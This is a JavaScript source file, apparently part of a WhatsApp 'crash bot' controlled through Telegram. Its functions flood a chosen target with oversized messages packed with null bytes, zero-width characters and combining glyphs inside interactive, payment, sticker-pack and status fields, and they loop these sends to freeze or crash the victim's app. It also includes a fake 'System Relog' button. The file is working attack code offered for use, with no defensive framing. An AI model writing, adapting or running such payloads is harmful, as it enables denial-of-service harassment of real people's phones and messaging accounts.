  const crashUrl = "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true=" + "💀".repeat(130000);

  for (let i = 0; i < 10; i++) {
    try {
      await sock.relayMessage(target, {
        extendedTextMessage: {
          text: crashChar,
          contextInfo: {
            urlTrackingMap: {
              urlTrackingMapElements: [{ url: crashUrl }]
            },
            mentionedJid: [target]
          }
        }
      }, { participant: { jid: target } });
      await delay(200);

      await sock.relayMessage(target, {
        interactiveMessage: {
          body: { text: zeroWidth + nullChar },
          footer: { text: crashChar },
          nativeFlowMessage: {
            name: "ios_crash_ui",
            paramsJson: nullChar,
            version: 3
          },
          contextInfo: { mentionedJid: [target] }
        }
      }, { participant: { jid: target } });
      await delay(200);

      await sock.relayMessage('status@broadcast', {
        extendedTextMessage: {
          text: nullChar + zeroWidth,
          contextInfo: { mentionedJid: [target] }
        }
      }, { statusJidList: [target] });
      await delay(250);
    } catch (err) {}
  }
}

async function DelayBulldozer(sock, target) {
  const delay = ms => new Promise(r => setTimeout(r, ms));
  const nullChar = "\u0000".repeat(150000);
  const zeroWidth = "‍".repeat(120000);
  const crashChar = "𑇂".repeat(100000);
  const space = " ".repeat(80000);
  const blankChar = "".repeat(100000);
  const types = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

  for (let i = 0; i < 8; i++) {
    try {
      const randomType = types[Math.floor(Math.random() * types.length)];
      const payload = nullChar + zeroWidth + crashChar;

      await sock.sendMessage(target, {
        text: space + nullChar + blankChar,
        mentions: [target]
      });
      await delay(150);

      await sock.relayMessage(target, {
        interactiveMessage: {
          body: { text: zeroWidth + blankChar },
          footer: { text: crashChar },
          nativeFlowMessage: {
            name: randomType,
            paramsJson: payload,
            version: 3
          }
        }
      }, { participant: { jid: target } });
      await delay(150);

      await sock.sendMessage(target, {
        react: {
          text: zeroWidth,
          key: { remoteJid: target, fromMe: true, id: "gm_" + Date.now() + "_" + i }
        }
      });
      await delay(150);

      await sock.relayMessage('status@broadcast', {
        extendedTextMessage: {
          text: crashChar + nullChar + blankChar,
          contextInfo: { mentionedJid: [target] }
        }
      }, { statusJidList: [target] });
      await delay(200);
    } catch (err) {}
  }

  for (let f = 0; f < 2; f++) {
    await sock.relayMessage('status@broadcast', {
      conversation: "\u0000".repeat(200000) + blankChar
    }, {
      statusJidList: [target],
      additionalNodes: [{ tag: 'meta', attrs: { from: 'system@whatsapp.net' } }]
    });
    await delay(100);
  }
}

async function gmDelayInvisCrush(sock, target) {
  const delay = ms => new Promise(r => setTimeout(r, ms));
  const kosong = "\u0000".repeat(150000);
  const crashChar = "𑇂".repeat(150000);
  const mmgUrl = "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true";

  for (let i = 0; i < 8; i++) {
    try {
      await sock.relayMessage(target, {
        extendedTextMessage: {
          text: kosong,
          contextInfo: {
            urlTrackingMap: {
              urlTrackingMapElements: [{ url: mmgUrl }]
            },
            mentionedJid: [target]
          }
        }
      }, { participant: { jid: target } });
      await delay(500);

      await sock.relayMessage(target, {
        interactiveMessage: {
          body: { text: crashChar },
          footer: { text: kosong },
          nativeFlowMessage: {
            name: "invis_crush",
            paramsJson: crashChar,
            version: 3
          },
          contextInfo: { mentionedJid: [target] }
        }
      }, { participant: { jid: target } });
      await delay(500);

      await sock.relayMessage('status@broadcast', {
        extendedTextMessage: {
          text: kosong + crashChar,
          contextInfo: { mentionedJid: [target] }
        }
      }, { statusJidList: [target] });
      await delay(500);
    } catch (err) {}
  }
}

async function BlankKebabEnaktau(sock, target) {
   const msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: { text: "KEBAB ENAK TAU", format: 1 },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: JSON.stringify({
                    wa_flow_response_params: {
                        title: "𑇂𑆵𑆴𑆿".repeat(60000)
                    }
                }),
                version: 3
            }
        }
    }, {
        participant: { jid: target }
    });
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "KEBAB ENAK TAU"
            },
            nativeFlowMessage: {
            buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});
  
  await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "z".repeat(100000),
        publisher: "x".repeat(80000),
        stickers: [],
        fileLength: "9999999999999",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        packDescription: "y".repeat(70000),
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
    
await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: {"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function KebabBlank(sock, target) {
    const maxAttempts = 60;
    let attempt = 0;
    
    while (attempt < maxAttempts) {
        try {
            
            await blanknoclik(sock,target)
            
            await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "ZhidanKebab" + "ꦽ".repeat(25000),
            contentText: "ZhidanKebabNih" + "ꦽ".repeat(25000),
            contextInfo: {
              forwardingScore: 999,
              isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  { originalUrl: "https://t.me/zhidankebab", unconsentedUsersUrl: "https://t.me/zhidankebab", consentedUsersUrl: "https://t.me/zhidankebab", cardIndex: 1 },
                  { originalUrl: "https://t.me/zhidankebab", unconsentedUsersUrl: "https://t.me/zhidankebab", consentedUsersUrl: "https://t.me/zhidankebab", cardIndex: 2 }
                ]
              },
              quotedMessage: {
                interactiveResponseMessage: {
                  body: { text: "ZhidanKebab", format: "DEFAULT" },
                  nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"X","address":"Yd7","tower_number":"Y7d","city":"chindo","name":"d7y","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"X${nullByte(900000)}"}}`,
                    version: 3
                  },
                  disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
                  paymentInviteMessage: { serviceType: "IDR", expiryTimestamp: Date.now() + 5184000000 },
                  buttonParamsJson: JSON.stringify({ flow_cta: "X", flow_message_version: "3" })
                }
              }
            },
            headerType: 1
          }
        }
      }
    }, { participant: { jid: target } });
            
            await new Promise(resolve => setTimeout(resolve, 50));
            
            await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: { remoteJid: target, fromMe: true, id: null },
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "false", statusQuestion: "true" },
                content: undefined,
              },
            ],
          },
        },
      }, {});
            
            
            const relogPayload = {
                interactiveMessage: {
                    body: {
                        text: "🔄 System Relog",
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Click to Relog",
                                    id: "relog_click_" + Date.now()
                                })
                            }
                        ]
                    }
                }
            };
            
            await sock.sendMessage(target, relogPayload);
            console.log(`[Combined] Attempt ${attempt + 1}/${maxAttempts}`);
            
            await new Promise(resolve => setTimeout(resolve, 100));
            
            attempt++;
            
        } catch (error) {
            console.error(`Error at attempt ${attempt + 1}:`, error.message);
            attempt++;
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
}

async function KebabDingin(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo"
            },
            nativeFlowMessage: {
            buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});
  
  await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "z".repeat(100000),
        publisher: "x".repeat(80000),
        stickers: [],
        fileLength: "9999999999999",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        packDescription: "y".repeat(70000),
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
    
await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: {"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

// ━━━〔 χ-νуяℓєѕ 𝕮яαѕн MEMJALANKAN - BOT  〕━━━ //

(async () => {
  try {
    console.clear();

    const startTime = Date.now();

    const log = (msg) => console.log(`\x1b[36m${msg}\x1b[0m`);
    const success = (msg) => console.log(`\x1b[32m${msg}\x1b[0m`);
    const error = (msg) => console.log(`\x1b[31m${msg}\x1b[0m`);

    console.log(`
╔══════════════════════════════╗
║      ⚡ χ-νуяℓєѕ 𝕮яαѕн ʙᴏᴛ sᴄʀɪᴘᴛ ⚡     ║
╚══════════════════════════════╝
`);

    log("🔄 Initializing system...");

    currentMode = getMode();
    success(`⚙️ Mode Loaded → ${currentMode}`);

    log("📡 Connecting WhatsApp session...");
    await startSesi();
    success("✅ WhatsApp Connected");

    log("🤖 Launching Telegram bot...");
    await bot.launch();
    success("✅ Telegram Bot Active");

    process.once("SIGINT", () => {
      error("🛑 SIGINT detected, shutting down...");
      bot.stop("SIGINT");
    });

    process.once("SIGTERM", () => {
      error("🛑 SIGTERM detected, shutting down...");
      bot.stop("SIGTERM");
    });

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log(`
╔══════════════════════════════╗
║   🟢 SYSTEM ACTIVED & ONLINE     ║
╠══════════════════════════════╣
║ ⏱️ Startup : ${uptime}s
║ 🔐 Status  : SECURE
║ 🌸 Engine  : ACTIVE
╚══════════════════════════════╝
`);

  } catch (err) {
    console.clear();

    console.log(`
╔══════════════════════════════╗
║      ❌ SYSTEM FAILED        ║
╚══════════════════════════════╝
`);

    console.error("\x1b[31m", err, "\x1b[0m");

    setTimeout(() => {
      console.log("\x1b[33m🔄 Auto Restarting System...\x1b[0m");
      process.exit(1);
    }, 3000);
  }
})();